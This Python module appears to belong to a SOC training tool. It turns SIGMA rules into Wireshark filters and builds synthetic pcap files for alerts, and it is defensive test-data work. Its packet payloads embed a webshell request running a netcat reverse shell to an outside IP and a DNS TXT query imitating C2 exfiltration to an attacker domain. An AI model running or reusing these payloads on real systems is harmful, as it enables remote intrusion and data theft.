import struct
import time
import socket
from typing import Dict, Any, Optional
from generator.models import DetectionAlert

class PcapAnalyzer:
    """
    Wireshark Integration Module for SOC Analyst Workstation.
    - Synthesizes binary .pcap files (pcap format v2.4) for network alerts.
    - Compiles SIGMA detection rules to Wireshark Display Filters.
    """

    @staticmethod
    def to_wireshark_filter(rule_raw_dict: Dict[str, Any]) -> str:
        """
        Converts a SIGMA rule raw dict into a Wireshark Display Filter string.
        """
        rule_id = rule_raw_dict.get("id", "")
        detection = rule_raw_dict.get("detection", {})
        selection = detection.get("selection", {})

        filters = []
        if rule_id == "RULE-001":
            filters.append("tcp.port == 22 && ssh")
        elif rule_id == "RULE-003":
            filters.append("http && (http.request.method == \"POST\" || http.request.uri contains \"php\")")
        elif rule_id == "RULE-005":
            filters.append("tcp.port == 5985 || tcp.port == 5986 || tcp.port == 22")
        elif rule_id == "RULE-006":
            filters.append("dns.flags.response == 0 && dns.qry.type == 16")
        elif rule_id == "RULE-010":
            filters.append("kerberos && krb5.msg_type == 12 && krb5.cipher == 23")
        else:
            log_type = rule_raw_dict.get("log_source", {}).get("log_type", "")
            if "web" in log_type:
                filters.append("http")
            elif "auth" in log_type:
                filters.append("ssh || kerberos")
            else:
                filters.append("ip")

        return " && ".join(filters) if filters else "ip"

    @staticmethod
    def generate_pcap_bytes(alert_dict: Dict[str, Any]) -> bytes:
        """
        Constructs a valid binary .pcap file (Global Header + Packet Headers + Ethernet/IP/UDP/TCP Frames)
        for a given network alert.
        """
        # PCAP Global Header (24 bytes)
        # magic_number (0xa1b2c3d4), version_major (2), version_minor (4), timezone (0), sigfigs (0), snaplen (65535), network (1 = Ethernet)
        global_header = struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)

        rule_id = alert_dict.get("rule_id", "")
        hostname = alert_dict.get("hostname", "host-node")
        src_ip = alert_dict.get("details", {}).get("source_ip") or "192.168.1.105"
        dst_ip = "10.0.4.15"

        packets = []

        now_sec = int(time.time())
        now_usec = 100000

        if rule_id == "RULE-006":
            # Synthesize DNS TXT query packet
            dns_query_payload = b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" \
                                b"\x06stage1\x05exfil\x02c2\x08attacker\x03com\x00" \
                                b"\x00\x10\x00\x01"  # Type TXT (16), Class IN (1)
            udp_header = struct.pack(">HHHH", 53530, 53, 8 + len(dns_query_payload), 0)
            ip_header = struct.pack(">BBHHHBBH4s4s", 0x45, 0, 20 + 8 + len(dns_query_payload), 54321, 0, 64, 17, 0, socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
            eth_header = b"\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\x08\x00"
            frame = eth_header + ip_header + udp_header + dns_query_payload
            packets.append((now_sec, now_usec, frame))
        elif rule_id == "RULE-003":
            # Synthesize HTTP POST Webshell payload packet
            http_payload = b"POST /upload.php?cmd=nc+185.220.101.5+4444+-e+/bin/sh HTTP/1.1\r\nHost: target-web.local\r\nUser-Agent: python-requests/2.28.1\r\nContent-Length: 0\r\n\r\n"
            tcp_header = struct.pack(">HHIIBBHHH", 49200, 80, 1000, 0, 0x50, 0x18, 64240, 0, 0)
            ip_header = struct.pack(">BBHHHBBH4s4s", 0x45, 0, 20 + 20 + len(http_payload), 54322, 0, 64, 6, 0, socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
            eth_header = b"\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\x08\x00"
            frame = eth_header + ip_header + tcp_header + http_payload
            packets.append((now_sec, now_usec, frame))
        else:
            # Generic TCP packet
            tcp_payload = f"ALERT {rule_id} TRIGGERED ON {hostname} SRC {src_ip}".encode("utf-8")
            tcp_header = struct.pack(">HHIIBBHHH", 51200, 22, 2000, 0, 0x50, 0x18, 64240, 0, 0)
            ip_header = struct.pack(">BBHHHBBH4s4s", 0x45, 0, 20 + 20 + len(tcp_payload), 54323, 0, 64, 6, 0, socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
            eth_header = b"\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\x08\x00"
            frame = eth_header + ip_header + tcp_header + tcp_payload
            packets.append((now_sec, now_usec, frame))

        # Packets Serialization
        pcap_data = bytearray(global_header)
        for ts_sec, ts_usec, frame in packets:
            incl_len = len(frame)
            orig_len = len(frame)
            pkt_header = struct.pack("<IIII", ts_sec, ts_usec, incl_len, orig_len)
            pcap_data.extend(pkt_header)
            pcap_data.extend(frame)

        return bytes(pcap_data)
